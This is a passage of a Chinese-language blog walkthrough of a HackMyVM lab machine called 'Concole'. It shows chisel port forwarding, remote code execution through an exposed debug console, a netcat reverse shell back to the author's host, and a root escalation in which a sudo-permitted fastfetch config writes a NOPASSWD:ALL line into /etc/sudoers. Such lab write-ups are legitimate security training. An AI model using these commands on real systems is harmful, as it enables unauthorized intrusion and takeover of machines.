+tcp       LISTEN      0           128                          *:80                        *:*
+tcp       LISTEN      0           128                       [::]:22                     [::]:*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现5000端口还不能访问，使用chisel将端口转发</p>
+<p>使用busybox wget将chisel拿到靶机上，并且赋予权限</p>
+<pre class="line-numbers language-none"><code class="language-none">welcome@Console:~$ busybox wget 192.168.134.76&#x2F;chisel
+Connecting to 192.168.134.76 (192.168.134.76:80)
+chisel               100% |******************************************************| 9152k  0:00:00 ETA
+welcome@Console:~$ chmod +x chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后再本机上开启服务</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;var&#x2F;www&#x2F;html]
+└─# &#x2F;var&#x2F;www&#x2F;html&#x2F;chisel server -p 443 --reverse
+2025&#x2F;06&#x2F;27 03:29:46 server: Reverse tunnelling enabled
+2025&#x2F;06&#x2F;27 03:29:46 server: Fingerprint KYYsMT4PwInuK8awY3KA1&#x2F;A&#x2F;XZVXEUc+4jKmD6aWank&#x3D;
+2025&#x2F;06&#x2F;27 03:29:46 server: Listening on http:&#x2F;&#x2F;0.0.0.0:443
+2025&#x2F;06&#x2F;27 03:29:52 server: session#1: tun: proxy#R:3000&#x3D;&gt;0.0.0.0:5000: Listening<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>靶机与本机建立连接</p>
+<pre class="line-numbers language-none"><code class="language-none">welcome@Console:~$ .&#x2F;chisel client 192.168.134.76:443 R:3000:0.0.0.0:5000
+2025&#x2F;06&#x2F;27 03:29:39 client: Connecting to ws:&#x2F;&#x2F;192.168.134.76:443
+2025&#x2F;06&#x2F;27 03:29:39 client: Connection error: dial tcp 192.168.134.76:443: connect: connection refused
+2025&#x2F;06&#x2F;27 03:29:39 client: Retrying in 100ms...
+2025&#x2F;06&#x2F;27 03:29:39 client: Connection error: dial tcp 192.168.134.76:443: connect: connection refused (Attempt: 1&#x2F;unlimited)
+2025&#x2F;06&#x2F;27 03:29:39 client: Retrying in 200ms...
+2025&#x2F;06&#x2F;27 03:29:39 client: Connection error: dial tcp 192.168.134.76:443: connect: connection refused (Attempt: 2&#x2F;unlimited)
+2025&#x2F;06&#x2F;27 03:29:39 client: Retrying in 400ms...
+2025&#x2F;06&#x2F;27 03:29:40 client: Connection error: dial tcp 192.168.134.76:443: connect: connection refused (Attempt: 3&#x2F;unlimited)
+2025&#x2F;06&#x2F;27 03:29:40 client: Retrying in 800ms...
+2025&#x2F;06&#x2F;27 03:29:40 client: Connection error: dial tcp 192.168.134.76:443: connect: connection refused (Attempt: 4&#x2F;unlimited)
+2025&#x2F;06&#x2F;27 03:29:40 client: Retrying in 1.6s...
+2025&#x2F;06&#x2F;27 03:29:42 client: Connection error: dial tcp 192.168.134.76:443: connect: connection refused (Attempt: 5&#x2F;unlimited)
+2025&#x2F;06&#x2F;27 03:29:42 client: Retrying in 3.2s...
+2025&#x2F;06&#x2F;27 03:29:45 client: Connection error: dial tcp 192.168.134.76:443: connect: connection refused (Attempt: 6&#x2F;unlimited)
+2025&#x2F;06&#x2F;27 03:29:45 client: Retrying in 6.4s...
+2025&#x2F;06&#x2F;27 03:29:52 client: Connected (Latency 674.669µs)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着去kali内访问127.0.0.1:3000端口</p>
+<style>.umqeathynixk{zoom: 67%;}</style><img src="/posts/3bb8f4e6/undefined/image-20250627153425996.png" class="umqeathynixk" alt="image-20250627153425996">
+
+<p>尝试扫目录</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# dirsearch -u 127.0.0.1:3000
+&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;dirsearch&#x2F;dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https:&#x2F;&#x2F;setuptools.pypa.io&#x2F;en&#x2F;latest&#x2F;pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (&#x2F;_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: &#x2F;home&#x2F;kali&#x2F;reports&#x2F;_127.0.0.1_3000&#x2F;_25-06-27_03-35-13.txt
+
+Target: http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;
+
+[03:35:13] Starting:
+[03:35:57] 200 -    2KB - &#x2F;console
+[03:36:59] 405 -  153B  - &#x2F;submit
+
+Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>扫到了一个console目录</p>
+<p><img src="/posts/3bb8f4e6/image-20250627154940288.png" alt="image-20250627154940288"></p>
+<p>让我们输入pin码，拿着刚才得到的pin码进行输入</p>
+<p><img src="/posts/3bb8f4e6/image-20250627155048538.png" alt="image-20250627155048538"></p>
+<p>提示可以使用python进行rce</p>
+<pre class="line-numbers language-none"><code class="language-none">import os;os.system(&quot;busybox nc 192.168.134.249 443 -e &#x2F;bin&#x2F;bash&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到了shell</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.134.249] from (UNKNOWN) [192.168.134.92] 40186
+uid&#x3D;1001(qaq) gid&#x3D;1001(qaq) groups&#x3D;1001(qaq)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查看qaq的sudo权限</p>
+<pre class="line-numbers language-none"><code class="language-none">qaq@Console:~$ sudo -l
+Matching Defaults entries for qaq on Console:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User qaq may run the following commands on Console:
+    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;fastfetch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以使用fastfetch进行提权</p>
+<p>在<a target="_blank" rel="noopener" href="https://github.com/xerolinux/xero-layan-git/blob/main/Configs/Home/.config/fastfetch/config.jsonc">github</a>上找到了一个可以修改fastfetch.config文件内容的文章,接着现在本地用&#x2F;usr&#x2F;bin&#x2F;fastfetch –gen-config命令新建一个config文件</p>
+<pre class="line-numbers language-none"><code class="language-none">qaq@Console:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;fastfetch --gen-config
+The generated config file has been written in &#96;&#x2F;home&#x2F;qaq&#x2F;fastfetch&#x2F;config.jsonc&#96;
+qaq@Console:&#x2F;tmp$ ls
+chmod    systemd-private-1007f15f03b54ff5a0a75f035cd575dd-apache2.service-EQ8MMf         systemd-private-1007f15f03b54ff5a0a75f035cd575dd-systemd-timesyncd.service-RWsHsf
+exp.lua  systemd-private-1007f15f03b54ff5a0a75f035cd575dd-systemd-logind.service-643Eqj
+qaq@Console:&#x2F;tmp$ cd &#x2F;home&#x2F;qaq
+qaq@Console:~$ ls
+fastfetch
+qaq@Console:~$ cd fastfetch&#x2F;
+qaq@Console:~&#x2F;fastfetch$ ls
+config.jsonc
+qaq@Console:~&#x2F;fastfetch$ vi config.jsonc
+qaq@Console:~&#x2F;fastfetch$ cat config.jsonc
+&#123;
+  &quot;$schema&quot;: &quot;https:&#x2F;&#x2F;github.com&#x2F;fastfetch-cli&#x2F;fastfetch&#x2F;raw&#x2F;dev&#x2F;doc&#x2F;json_schema.json&quot;,
+  &quot;modules&quot;: [
+    &quot;title&quot;,
+    &quot;separator&quot;,
+    &quot;os&quot;,
+    &quot;host&quot;,
+    &quot;kernel&quot;,
+    &quot;uptime&quot;,
+    &quot;packages&quot;,
+    &quot;shell&quot;,
+    &quot;display&quot;,
+    &quot;de&quot;,
+    &quot;wm&quot;,
+    &quot;wmtheme&quot;,
+    &quot;theme&quot;,
+    &quot;icons&quot;,
+    &quot;font&quot;,
+    &quot;cursor&quot;,
+    &quot;terminal&quot;,
+    &quot;terminalfont&quot;,
+    &quot;cpu&quot;,
+    &quot;gpu&quot;,
+    &quot;memory&quot;,
+    &quot;swap&quot;,
+    &quot;disk&quot;,
+    &quot;localip&quot;,
+    &quot;battery&quot;,
+    &quot;poweradapter&quot;,
+    &quot;locale&quot;,
+    &quot;break&quot;,
+    &quot;colors&quot;
+  ]
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着拿刚才在github上找到的内容修改配置文件,再次运行就会得到下面的界面</p>
+<p><img src="/posts/3bb8f4e6/image-20250627164619950.png" alt="image-20250627164619950"></p>
+<p>因为config内有一个可以运行command命令的位置，将这个位置进行修改</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+         &quot;type&quot;: &quot;command&quot;,
+         &quot;key&quot;: &quot;  OS Age &quot;,
+         &quot;keyColor&quot;: &quot;magenta&quot;,
+         &quot;keyWidth&quot;: 12,
+         &quot;text&quot;: &quot;birth_install&#x3D;$(stat -c %W &#x2F;); current&#x3D;$(date +%s); time_progression&#x3D;$((current - birth_install)); days_difference&#x3D;$((time_progression &#x2F; 86400)); echo $days_difference days&quot;
+     &#125;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将其修改为如下内容</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;
+         &quot;type&quot;: &quot;command&quot;,
+         &quot;key&quot;: &quot;  OS Age &quot;,
+         &quot;keyColor&quot;: &quot;magenta&quot;,
+         &quot;keyWidth&quot;: 12,
+         &quot;text&quot;: &quot;echo &#39;welcome ALL&#x3D;(ALL:ALL) NOPASSWD:ALL&#39; &gt;&gt; &#x2F;etc&#x2F;sudoers&quot;
+     &#125;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再次运行会得到下面的界面</p>
+<p><img src="/posts/3bb8f4e6/image-20250627172900736.png" alt="image-20250627172900736"></p>
+<p>最下面的system times处比一开始少了一行，接着去welcome用户界面再次查看sudo权限</p>
+<pre class="line-numbers language-none"><code class="language-none">welcome@Console:~$ sudo -l
+Matching Defaults entries for welcome on Console:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin
+
+User welcome may run the following commands on Console:
+    (qaq) PASSWD: &#x2F;bin&#x2F;cat &#x2F;opt&#x2F;flask-app&#x2F;logs&#x2F;flask.log
+    (ALL : ALL) NOPASSWD: ALL
+    (ALL : ALL) NOPASSWD: ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>多了一个权限</p>
+<h4 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h4><pre class="line-numbers language-none"><code class="language-none">welcome@Console:~$ sudo -i
+root@Console:~# id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)
+root@Console:~# cd &#x2F;root
+root@Console:~# ls -al
+total 68
+drwx------  6 root root  4096 May 17 06:18 .
+drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
+-rw-------  1 root root   328 May 17 06:18 .bash_history
+-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
+drwxr-xr-x  4 root root  4096 Apr  4 22:04 .cache
+drwx------  3 root root  4096 Apr  4 21:00 .gnupg
+drwxr-xr-x  3 root root  4096 Mar 18 21:04 .local
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rw-r--r--  1 root root    44 May 17 06:00 r00t.txt
+drwx------  2 root root  4096 May 17 04:16 .ssh
+-rw-------  1 root root 21582 May 17 06:01 .viminfo
+-rw-------  1 root root   159 May 16 10:39 .Xauthority
+root@Console:~# cat r00t.txt
+flag&#123;root-009de5ebccb9fdecce2c4ac893bca6fa&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/3bb8f4e6.html">https://drume2.github.io/posts/3bb8f4e6.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HMV/">HMV</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/5.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/7ffe1a8a.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/10.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-Alzheimer</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/7ffe1a8a.html" title="HMV-Alzheimer"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/10.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-26</div><div class="title">HMV-Alzheimer</div></div></a></div><div><a href="/posts/997d3111.html" title="HMV-Helium"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/9.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-25</div><div class="title">HMV-Helium</div></div></a></div><div><a href="/posts/576162f9.html" title="HMV-Devoops"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-20</div><div class="title">HMV-Devoops</div></div></a></div><div><a href="/posts/19118055.html" title="HMV-Slowman"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/8.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-24</div><div class="title">HMV-Slowman</div></div></a></div><div><a href="/posts/22cb9a91.html" title="HMV-Twisted"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/15.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-22</div><div class="title">HMV-Twisted</div></div></a></div><div><a href="/posts/6244f084.html" title="HMV-Webmaster"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/13.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-21</div><div class="title">HMV-Webmaster</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HMV-Concole"><span class="toc-number">1.</span> <span class="toc-text">HMV-Concole</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E9%99%86"><span class="toc-number">1.2.</span> <span class="toc-text">ssh登陆</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#userflag"><span class="toc-number">1.2.1.</span> <span class="toc-text">userflag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.3.1.</span> <span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rootflag"><span class="toc-number">1.3.2.</span> <span class="toc-text">rootflag</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/3bb8f4e6.html" title="HMV-Concole"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/5.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Concole"/></a><div class="content"><a class="title" href="/posts/3bb8f4e6.html" title="HMV-Concole">HMV-Concole</a><time datetime="2025-06-27T06:01:51.000Z" title="发表于 2025-06-27 14:01:51">2025-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7ffe1a8a.html" title="HMV-Alzheimer"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/10.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Alzheimer"/></a><div class="content"><a class="title" href="/posts/7ffe1a8a.html" title="HMV-Alzheimer">HMV-Alzheimer</a><time datetime="2025-06-26T08:38:55.000Z" title="发表于 2025-06-26 16:38:55">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/997d3111.html" title="HMV-Helium"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/9.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Helium"/></a><div class="content"><a class="title" href="/posts/997d3111.html" title="HMV-Helium">HMV-Helium</a><time datetime="2025-06-25T14:14:48.000Z" title="发表于 2025-06-25 22:14:48">2025-06-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/19118055.html" title="HMV-Slowman"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/8.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Slowman"/></a><div class="content"><a class="title" href="/posts/19118055.html" title="HMV-Slowman">HMV-Slowman</a><time datetime="2025-06-24T15:57:41.000Z" title="发表于 2025-06-24 23:57:41">2025-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e8b3ee3e.html" title="Space"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/7.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Space"/></a><div class="content"><a class="title" href="/posts/e8b3ee3e.html" title="Space">Space</a><time datetime="2025-06-23T15:32:44.000Z" title="发表于 2025-06-23 23:32:44">2025-06-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
+      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
+      avatar: 'monsterid',
+      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Twikoo' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
